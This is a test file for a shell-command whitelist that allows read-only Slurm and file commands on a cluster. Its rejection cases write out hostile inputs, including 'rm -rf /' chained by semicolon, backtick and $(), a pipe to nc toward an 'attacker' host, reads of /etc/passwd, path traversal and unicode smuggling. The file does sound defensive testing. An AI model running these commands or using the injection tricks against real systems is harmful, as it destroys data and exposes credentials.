import { describe, expect, it } from 'vitest';
import { SAFE_COMMAND_PATTERNS, isSafeReadCommand } from './whitelist';

describe('whitelist — positive cases', () => {
  const accepted = [
    'squeue',
    'squeue -u jvadala',
    'squeue -j 1234567',
    'squeue -j 1234567_3',
    'squeue -p dgx-b200',
    'sinfo',
    'sinfo -p dgx-b200',
    'sacct -j 9999',
    'sacct -j 9999 --format=JobID,State,Elapsed,ExitCode',
    'parcc_quota.py',
    'parcc_du.py /vast/projects/my-proj/',
    'parcc_du.py /vast/home/j/jvadala/',
    'parcc_sfree.py',
    'parcc_sqos.py',
    'parcc_sreport.py',
    'parcc_sreport.py --user jvadala',
    'parcc_sdebug.py --job 12345',
    'parcc_sdebug.py --node node-01',
    'ls /vast/home/j/jvadala/',
    'ls /vast/home/j/jvadala/runs/exp-42',
    'ls -l /vast/home/j/jvadala/',
    'ls -la /vast/projects/acme/data',
    'cat /vast/home/j/jvadala/runs/slurm-12345.out',
    'cat /vast/home/j/jvadala/runs/slurm-12345.err',
    'cat /vast/home/j/jvadala/notes.md',
    'cat /vast/home/j/jvadala/config.yaml',
    'tail -n 200 /vast/home/j/jvadala/runs/slurm-12345.out',
  ];
  for (const cmd of accepted) {
    it(`accepts: ${cmd}`, () => {
      expect(isSafeReadCommand(cmd)).toBe(true);
    });
  }
});

describe('whitelist — adversarial cases (must reject)', () => {
  const rejected: Array<[string, string]> = [
    ['empty', ''],
    ['semicolon injection', 'squeue; rm -rf /'],
    ['pipe injection', 'squeue | nc attacker 9000'],
    ['backtick injection', 'squeue `rm -rf /`'],
    ['$() injection', 'squeue $(rm -rf /)'],
    ['dollar var', 'squeue $HOME'],
    ['redirect append', 'squeue >> /etc/passwd'],
    ['redirect overwrite', 'squeue > /tmp/x'],
    ['redirect read', 'cat < /etc/passwd'],
    ['ampersand background', 'squeue &'],
    ['double-amp chain', 'squeue && rm -rf /'],
    ['newline injection', 'squeue\nrm -rf /'],
    ['carriage return', 'squeue\rrm -rf /'],
    ['NUL byte', 'squeue\u0000rm'],
    ['tab separator', 'squeue\t-u\tjvadala'],
    ['trailing space', 'squeue '],
    ['leading space', ' squeue'],
    ['double space', 'squeue  -u jvadala'],
    ['dot-dot escape in ls', 'ls /vast/home/j/jvadala/../root'],
    ['dot-dot escape in cat', 'cat /vast/home/j/jvadala/../../etc/passwd'],
    ['absolute outside /vast', 'ls /etc'],
    ['relative path', 'ls ~'],
    ['ls of /etc', 'ls /etc/passwd'],
    ['cat of /etc', 'cat /etc/passwd'],
    ['cat outside home', 'cat /vast/projects/acme/secret.yaml'],
    ['cat of .sh disallowed ext', 'cat /vast/home/j/jvadala/run.sh'],
    ['cat of .py disallowed ext', 'cat /vast/home/j/jvadala/train.py'],
    ['unicode cyrillic a in squeue', 'squeue -u jvаdala'], // second "а" is Cyrillic U+0430
    ['unicode rtl override', 'squeue\u202e -u jvadala'],
    ['zero-width space', 'squeue\u200b'],
    ['fullwidth digits', 'squeue -j １２３'],
    ['command substitution dollar-brace', 'squeue ${IFS}rm'],
    ['brace expansion', 'ls /vast/home/j/jvadala/{a,b}'],
    ['wildcard glob', 'ls /vast/home/j/jvadala/*'],
    ['question mark glob', 'ls /vast/home/j/jvadala/?'],
    ['bang history', 'squeue !!'],
    ['comment suffix', 'squeue # safe'],
    ['tilde expansion', 'ls ~/runs'],
    ['quoted injection', 'ls "/vast/home/j/jvadala"'],
    ['single-quoted injection', "ls '/vast/home/j/jvadala'"],
    ['backslash escape', 'ls /vast/home/j/jvadala\\'],
    ['unknown subcommand', 'scancel 12345'],
    ['sacct with injection in format', 'sacct -j 1 --format=JobID;rm'],
    ['squeue with flag not allowed', 'squeue --me'],
    ['massive input', 'squeue' + ' '.repeat(1000)],
    ['numeric overflow in job id', 'squeue -j ' + '1'.repeat(6000)],
    ['non-string', 123 as unknown as string],
    ['null input', null as unknown as string],
    ['undefined input', undefined as unknown as string],
  ];
  for (const [label, cmd] of rejected) {
    it(`rejects: ${label}`, () => {
      expect(isSafeReadCommand(cmd)).toBe(false);
    });
  }
});

describe('whitelist — invariants', () => {
  it('every pattern is fully anchored', () => {
    for (const re of SAFE_COMMAND_PATTERNS) {
      expect(re.source.startsWith('^')).toBe(true);
      expect(re.source.endsWith('$')).toBe(true);
    }
  });

  it('exports a non-empty readonly pattern list', () => {
    expect(SAFE_COMMAND_PATTERNS.length).toBeGreaterThan(0);
  });
});
